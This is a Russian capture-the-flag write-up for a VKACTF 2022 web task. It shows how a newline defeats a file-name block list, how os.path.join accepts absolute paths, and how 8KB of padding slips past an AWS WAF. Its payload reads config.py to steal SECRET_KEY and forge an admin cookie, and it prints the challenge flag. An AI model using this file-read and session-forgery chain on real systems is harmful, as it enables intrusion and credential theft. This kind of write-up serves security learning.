## Огневой вал

| Событие | Название | Категория | Сложность |
| :------ | ---- | ---- | ---- |
| VKACTF 2022 | Огневой вал  | Web | Средняя |

  
### Описание


> Автор: [ vChuk ]
>
> Стоит возле леса избушка на кибер-протезах. Многие молодцы просили их накормить и спать уложить хозяйку, да только не возвращался из них никто. Не доверяй своему зрению коли пойдешь к ней, не слушай речей сладких, не кушай яблочек красных – меч обнажи и только вперед иди…


### Решение
В веб приложении был функционал, позволяющий читать файлы других юзеров. На имя файла, была проверка
```python
BLACK_LIST = ["/", "#", "!", "@", ";", '"', "'"]

def validator(name):
    for element in BLACK_LIST:
        if re.match(rf".*{element}.*", name):
            return None, "Обнаружен запрещенный символ"
    if ".." in name: return None, "Обнаружен запрещенный символ!"   # <- DETECT LFI
    
    return name.strip(), None
```
Ошибка заключалась, в том, что re.match - ищет значения на первой строчке, т.е. до первого символа "\n". 

При составлении пути был контроль только над filename, ".." был явно запрещен, но os.path.join реалезован так, что если аргумент функции начнется с "/", путь будет составлен с корневой папки, и ошибки при этом не будет.     
```python
path = os.path.join(app.config['UPLOAD_FOLDER'],
                    usershare,
                    filename
                )
```

Последней защитой был WAF AWS. Его обход был возможен с помощью, так называемой [8KB bullet](https://kloudle.com/blog/the-infamous-8kb-aws-waf-request-body-inspection-limitation)

Объединив эти ошибки получаем возможность эксплуатации LFI.
Нагрузкой служит конструкция

```python
payload = " " * 1024 * 8
payload += "\n"
payload += full_path

# POST /share
usershare=some_username
filename = payload 
```
Через /download скачать было нельзя т.к. при такой конфигурации @app.route('/download/<filename>'), <filename> - все / считает как путь в url, а не название файла.

Т.к. неизвестно, какой файл необходимо прочиать, то остается вариант подделать сессию. SECRET_KEY находится в config.py

```python
payload = " " * 1024 * 8
payload += "\n"
payload += "/home/app/web/project/config.py"
```

Получив SECRET_KEY, генерируем куки admin и получаем файл c флагом. 

### Флаг

```
vka{waf_security_but_you_can_avoided_it}
```
